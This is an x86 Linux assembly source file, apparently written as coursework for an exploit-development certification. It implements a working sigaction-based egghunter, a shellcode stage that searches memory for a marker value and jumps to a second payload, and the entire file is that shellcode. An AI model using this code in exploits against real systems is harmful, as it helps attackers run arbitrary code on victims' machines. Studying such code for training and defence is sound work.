; Filename: egghunter.nasm
; 
; This blog post has been created for cmpleting the requirements of the
; SecurityTube Linux Assembly Expert certiication:
; http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/	
;
; Student ID: SLAE-1537	

global _start			

section .text
_start:

	; using the knowledge from these resources
	; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
	; https://www.absolomb.com/2018-04-13-Linux-x86-Egghunter/
	; I will use the sigaction method 

	xor ecx, ecx

Next_Page:
	; set ecx to point to the next memory page
	or cx,0xfff

Next_Address:
	; set ecx to point to the next address in a memory page
	inc ecx

	; save syscall number for sigaction function in eax and make the interrupt
	push byte +0x43
	pop eax
	int 0x80

	; if the checked address is invalid jump to the next page 
	cmp al,0xf2
	jz Next_Page

	; Egg Comparison
	; if the checked address from the previous comparison is valid 
	; we start the egg comparison
	mov eax,0x50905090   ; save the egg value in eax
	mov edi,ecx	     ; save the page pointer in edi
	scasd		     ; compare eax(egg value) to edi(page pointer value)
	jnz Next_Address     ; if not equal check the next address 
	scasd		     ; if equal compare the next 4 bytes
	jnz Next_Address     ; if not equal check the next address
	jmp edi		     ; if equal jump to out large payload



